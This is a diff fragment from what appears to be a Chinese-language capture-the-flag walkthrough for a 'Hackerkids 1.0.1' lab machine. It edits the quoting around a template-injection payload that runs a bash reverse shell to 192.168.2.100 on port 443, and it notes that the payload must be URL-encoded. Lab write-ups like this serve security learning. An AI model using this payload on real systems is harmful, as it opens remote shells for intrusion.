@@ -87,7 +87,7 @@ fuzz参数，发现`?page_no=21`不太一样
 
 ![image-20250922170420801](./../assets/images/2025-09-22-Hakckerkids-1.0.1-Walkthrough/image-20250922170420801.png)
 
-使用`{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.2.100/443 0>&1"')}}`反弹shell
+使用'`{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.2.100/443 0>&1"')}}`'反弹shell
 
 需要对`payload`进行全字符`url`编码
 
